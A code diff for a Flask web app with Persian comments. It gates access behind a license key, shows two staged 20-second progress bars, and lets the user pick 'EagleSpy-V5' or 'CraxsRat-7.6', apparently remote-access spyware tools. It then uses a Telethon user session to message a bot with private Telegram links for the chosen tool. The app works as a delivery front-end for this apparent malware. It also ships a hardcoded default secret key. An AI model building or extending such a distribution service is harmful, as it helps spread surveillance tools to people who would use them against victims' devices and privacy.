@@ -1,199 +1,469 @@
-from flask import Flask, request, render_template_string, flash, send_file, url_for
+from flask import Flask, request, render_template_string, redirect, url_for, session
 import os
+import asyncio
+from telethon import TelegramClient
+from telethon.sessions import StringSession
 
 app = Flask(__name__)
-# If SECRET_KEY is not provided in the environment, use the following default value.
-# Note: In production, it's strongly recommended to set your own SECRET_KEY.
-app.secret_key = os.environ.get("SECRET_KEY", "b4d9fbe7c38e2df1e4d1a0a61b2f8073")
 
-# --- Environment Variables (no defaults for sensitive info) ---
+# --- Environment Variables ---
+# تمامی این متغیرها باید در محیط (مثلاً Render) تنظیم شوند.
 API_ID = os.environ["API_ID"]
 API_HASH = os.environ["API_HASH"]
 SESSION_STRING = os.environ["SESSION_STRING"]
-BOT_USERNAME = os.environ["BOT_USERNAME"]  # Expected without the '@' in deep link
+BOT_USERNAME = os.environ["BOT_USERNAME"]  # بدون @ (مثلاً se36We)
 LICENSE_KEY = os.environ["LICENSE_KEY"]
 
-# --- HTML Templates with Professional Style ---
+# SECRET_KEY: برای سشن Flask
+app.secret_key = os.environ.get("SECRET_KEY", "b4d9fbe7c38e2df1e4d1a0a61b2f8073")
+
+# -------------------- HTML Templates --------------------
+
+# صفحه ورود لایسنس
 LICENSE_FORM_HTML = '''
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8">
-    <title>License Verification</title>
-    <style>
-      body {
-        background-color: #f7f7f7;
-        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-        margin: 0;
-      }
-      .container {
-        background: #fff;
-        padding: 30px;
-        border-radius: 8px;
-        box-shadow: 0 0 15px rgba(0,0,0,0.1);
-        text-align: center;
-        max-width: 400px;
-        width: 100%;
-      }
-      input[type="text"] {
-        width: 80%;
-        padding: 10px;
-        margin: 10px 0;
-        border: 1px solid #ccc;
-        border-radius: 4px;
-        font-size: 16px;
-      }
-      button {
-        padding: 10px 20px;
-        background-color: #007bff;
-        color: #fff;
-        border: none;
-        border-radius: 4px;
-        font-size: 16px;
-        cursor: pointer;
-      }
-      button:hover {
-        background-color: #0056b3;
-      }
-      .error {
-        color: #ff0000;
-      }
-    </style>
-  </head>
-  <body>
-    <div class="container">
-      <h2>Please enter your license key</h2>
-      {% with messages = get_flashed_messages() %}
-        {% if messages %}
-          <ul class="error">
-            {% for message in messages %}
-              <li>{{ message }}</li>
-            {% endfor %}
-          </ul>
-        {% endif %}
-      {% endwith %}
-      <form method="POST">
-        <input type="text" name="license" placeholder="License Key" required>
-        <br>
-        <button type="submit">Submit</button>
-      </form>
-    </div>
-  </body>
+<head>
+  <meta charset="UTF-8">
+  <title>License Verification</title>
+  <style>
+    body {
+      background: linear-gradient(135deg, #74ABE2 0%, #5563DE 100%);
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      color: #333;
+    }
+    .container {
+      background: #fff;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.2);
+      text-align: center;
+      max-width: 420px;
+      width: 90%;
+      animation: fadeIn 1s ease-in-out;
+    }
+    h2 {
+      margin-bottom: 20px;
+    }
+    input[type="text"] {
+      width: 80%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
+      outline: none;
+    }
+    button {
+      padding: 12px 24px;
+      background-color: #FF6B6B;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      margin-top: 10px;
+    }
+    button:hover {
+      background-color: #e85f5f;
+    }
+    .error {
+      color: #ff0000;
+      font-weight: bold;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Enter Your License Key</h2>
+    {% if error %}
+      <p class="error">{{ error }}</p>
+    {% endif %}
+    <form method="POST">
+      <input type="text" name="license" placeholder="License Key" required>
+      <br>
+      <button type="submit">Verify</button>
+    </form>
+  </div>
+</body>
 </html>
 '''
 
-VERIFIED_HTML = '''
+# پروگرس‌بار اول (20 ثانیه)
+PROGRESS_HTML_1 = '''
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8">
-    <title>License Confirmed</title>
-    <style>
-      body {
-        background-color: #f7f7f7;
-        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-        margin: 0;
+<head>
+  <meta charset="UTF-8">
+  <title>Processing License</title>
+  <style>
+    body {
+      background: linear-gradient(135deg, #ffafbd 0%, #ffc3a0 100%);
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      color: #333;
+    }
+    .container {
+      background: #fff;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.2);
+      text-align: center;
+      max-width: 420px;
+      width: 90%;
+      animation: fadeIn 0.8s ease-in-out;
+    }
+    h2 {
+      margin-bottom: 20px;
+    }
+    #progressBar {
+      width: 100%;
+      background-color: #ddd;
+      border-radius: 6px;
+      overflow: hidden;
+      margin-top: 20px;
+      height: 24px;
+    }
+    #progressBar div {
+      height: 24px;
+      width: 0%;
+      background: linear-gradient(90deg, #42e695 0%, #3bb2b8 100%);
+      border-radius: 6px;
+    }
+    #countdown {
+      font-size: 18px;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Please wait while we verify your license...</h2>
+    <div id="progressBar"><div></div></div>
+    <p id="countdown">20</p>
+  </div>
+
+  <script>
+    let width = 0;
+    let countdown = 20;
+    const interval = setInterval(() => {
+      width += 5;
+      countdown -= 1;
+      document.getElementById("progressBar").children[0].style.width = width + "%";
+      document.getElementById("countdown").textContent = countdown;
+      if (width >= 100) {
+        clearInterval(interval);
+        window.location.href = "{{ next_url }}";
       }
-      .container {
-        background: #fff;
-        padding: 30px;
-        border-radius: 8px;
-        box-shadow: 0 0 15px rgba(0,0,0,0.1);
-        text-align: center;
-        max-width: 500px;
-        width: 100%;
-      }
-      button {
-        padding: 10px 20px;
-        background-color: #28a745;
-        color: #fff;
-        border: none;
-        border-radius: 4px;
-        font-size: 16px;
-        cursor: pointer;
-      }
-      button:hover {
-        background-color: #218838;
-      }
-      a {
-        text-decoration: none;
-      }
-      .action-btn {
-        margin: 10px;
-      }
-    </style>
-  </head>
-  <body>
-    <div class="container">
-      <h2>Your license is confirmed!</h2>
-      <p>
-        To complete the process, your Telegram Desktop/Portable must be installed.
-        Click the button below to open Telegram. It will automatically open a chat with
-        <strong>@{{ bot_username }}</strong> with the pre-filled message <strong>"License {{ license_key }}"</strong>.
-      </p>
-      <p>
-        <a href="tg://resolve?domain={{ bot_username }}&text=License%20{{ license_key }}" class="action-btn">
-          <button type="button">Open Telegram</button>
-        </a>
-      </p>
-      <p>
-        A log file has been generated on the server. Click below to download it:
-      </p>
-      <p>
-        <a href="{{ url_for('download_log') }}" class="action-btn">
-          <button type="button">Download Log</button>
-        </a>
-      </p>
-    </div>
-  </body>
+    }, 1000);
+  </script>
+</body>
 </html>
 '''
 
-# --- Create Log File Function ---
-def create_log_file():
-    """
-    Creates a log file with the required content.
-    """
-    log_content = f"License {LICENSE_KEY}\nCode55888\nSarP5988888\n"
-    with open("license_log.txt", "w") as f:
-        f.write(log_content)
-    print("Log file generated successfully.")
+# صفحه انتخاب نرم‌افزار
+CHOOSE_SOFTWARE_HTML = '''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Choose Your Software</title>
+  <style>
+    body {
+      background: linear-gradient(to right, #8360c3, #2ebf91);
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      color: #333;
+    }
+    .container {
+      background: #fff;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.2);
+      text-align: center;
+      max-width: 420px;
+      width: 90%;
+      animation: fadeIn 0.8s ease-in-out;
+    }
+    h2 {
+      margin-bottom: 20px;
+    }
+    button {
+      padding: 12px 24px;
+      background-color: #FF6B6B;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      margin: 10px;
+    }
+    button:hover {
+      background-color: #e85f5f;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Please choose the software you want:</h2>
+    <form method="POST">
+      <button type="submit" name="software" value="EagleSpy-V5">EagleSpy-V5</button>
+      <button type="submit" name="software" value="CraxsRat-7.6">CraxsRat-7.6</button>
+    </form>
+  </div>
+</body>
+</html>
+'''
 
-# --- Routes ---
-@app.route("/", methods=["GET", "POST"])
-def index():
-    if request.method == "POST":
-        provided_license = request.form.get("license")
-        if provided_license != LICENSE_KEY:
-            flash("Incorrect license key. Please enter the correct license key.")
-            return render_template_string(LICENSE_FORM_HTML)
+# پروگرس‌بار دوم (20 ثانیه)
+PROGRESS_HTML_2 = '''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Finalizing Request</title>
+  <style>
+    body {
+      background: linear-gradient(to right, #ff9966, #ff5e62);
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      color: #333;
+    }
+    .container {
+      background: #fff;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.2);
+      text-align: center;
+      max-width: 420px;
+      width: 90%;
+      animation: fadeIn 0.8s ease-in-out;
+    }
+    h2 {
+      margin-bottom: 20px;
+    }
+    #progressBar {
+      width: 100%;
+      background-color: #ddd;
+      border-radius: 6px;
+      overflow: hidden;
+      margin-top: 20px;
+      height: 24px;
+    }
+    #progressBar div {
+      height: 24px;
+      width: 0%;
+      background: linear-gradient(90deg, #42e695 0%, #3bb2b8 100%);
+      border-radius: 6px;
+    }
+    #countdown {
+      font-size: 18px;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Please wait while we finalize your request...</h2>
+    <div id="progressBar"><div></div></div>
+    <p id="countdown">20</p>
+  </div>
+
+  <script>
+    let width = 0;
+    let countdown = 20;
+    const interval = setInterval(() => {
+      width += 5;
+      countdown -= 1;
+      document.getElementById("progressBar").children[0].style.width = width + "%";
+      document.getElementById("countdown").textContent = countdown;
+      if (width >= 100) {
+        clearInterval(interval);
+        // پس از پایان، به endpoint ارسال پیام‌ها می‌رویم
+        window.location.href = "{{ send_url }}";
+      }
+    }, 1000);
+  </script>
+</body>
+</html>
+'''
+
+# صفحه نهایی پس از ارسال پیام
+FINAL_HTML = '''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Process Completed</title>
+  <style>
+    body {
+      background: linear-gradient(135deg, #a1c4fd 0%, #c2e9fb 100%);
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      color: #333;
+    }
+    .container {
+      background: #fff;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.2);
+      text-align: center;
+      max-width: 500px;
+      width: 90%;
+      animation: fadeIn 1s ease-in-out;
+    }
+    h2 {
+      margin-bottom: 20px;
+    }
+    p {
+      font-size: 18px;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Process Completed Automatically!</h2>
+    <p>Your request has been processed and messages have been sent to the destination.</p>
+  </div>
+</body>
+</html>
+'''
+
+# -------------------- Telethon Function --------------------
+async def send_telegram_messages(software_choice):
+    """
+    با توجه به انتخاب نرم‌افزار، پیام‌های مناسب را به مقصد ارسال می‌کند.
+    """
+    async with TelegramClient(StringSession(SESSION_STRING), int(API_ID), API_HASH) as client:
+        if software_choice == "EagleSpy-V5":
+            message_text = "Get EagleSpy-V5 link"
+            link = "https://t.me/c/2344120391/214/233"
         else:
-            create_log_file()
-            return render_template_string(
-                VERIFIED_HTML,
-                bot_username=BOT_USERNAME,
-                license_key=LICENSE_KEY
-            )
-    return render_template_string(LICENSE_FORM_HTML)
+            message_text = "Get CraxsRat-7.6 link"
+            link = "https://t.me/c/2267427894/620"
+        # ارسال پیام اول
+        await client.send_message(BOT_USERNAME, message_text)
+        # ارسال پیام دوم (لینک)
+        await client.send_message(BOT_USERNAME, link)
 
-@app.route("/download-log")
-def download_log():
-    """
-    Sends the generated log file to the user for download.
-    """
-    log_file_path = "license_log.txt"
-    if not os.path.exists(log_file_path):
-        return "Log file not found.", 404
-    return send_file(log_file_path, as_attachment=True)
+# -------------------- Routes --------------------
 
+@app.route("/", methods=["GET", "POST"])
+def license_page():
+    """
+    صفحهٔ اصلی برای وارد کردن لایسنس.
+    """
+    if request.method == "POST":
+        provided_license = request.form.get("license", "")
+        if provided_license == LICENSE_KEY:
+            session["license_ok"] = True
+            return redirect(url_for("progress1"))
+        else:
+            error_msg = "Incorrect license key. Please enter the correct license key."
+            return render_template_string(LICENSE_FORM_HTML, error=error_msg)
+    return render_template_string(LICENSE_FORM_HTML, error=None)
+
+@app.route("/progress1")
+def progress1():
+    """
+    پروگرس‌بار اول (۲۰ ثانیه)؛ بعد از اتمام به صفحه انتخاب نرم‌افزار هدایت می‌شود.
+    """
+    if not session.get("license_ok"):
+        return redirect(url_for("license_page"))
+    return render_template_string(PROGRESS_HTML_1, next_url=url_for("choose_software"))
+
+@app.route("/choose_software", methods=["GET", "POST"])
+def choose_software():
+    """
+    صفحه انتخاب نرم‌افزار: EagleSpy-V5 یا CraxsRat-7.6.
+    """
+    if not session.get("license_ok"):
+        return redirect(url_for("license_page"))
+    if request.method == "POST":
+        software_choice = request.form.get("software", "")
+        session["software_choice"] = software_choice
+        return redirect(url_for("progress2"))
+    return render_template_string(CHOOSE_SOFTWARE_HTML)
+
+@app.route("/progress2")
+def progress2():
+    """
+    پروگرس‌بار دوم (۲۰ ثانیه)؛ پس از اتمام، کاربر به endpoint ارسال پیام‌ها هدایت می‌شود.
+    """
+    if not session.get("license_ok"):
+        return redirect(url_for("license_page"))
+    software_choice = session.get("software_choice")
+    if not software_choice:
+        return redirect(url_for("choose_software"))
+    return render_template_string(PROGRESS_HTML_2, send_url=url_for("send_messages"))
+
+@app.route("/send_messages")
+def send_messages():
+    """
+    endpoint برای ارسال پیام‌ها به مقصد از طریق Telethon و سپس هدایت به صفحه نهایی.
+    """
+    if not session.get("license_ok"):
+        return redirect(url_for("license_page"))
+    software_choice = session.get("software_choice")
+    if not software_choice:
+        return redirect(url_for("choose_software"))
+    # ارسال پیام‌ها به‌صورت همزمان با استفاده از Telethon
+    asyncio.run(send_telegram_messages(software_choice))
+    return redirect(url_for("final"))
+
+@app.route("/final")
+def final():
+    """
+    صفحه نهایی که نشان می‌دهد روند به‌طور خودکار تکمیل شده است.
+    """
+    return render_template_string(FINAL_HTML)
+
+# -------------------- Main --------------------
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
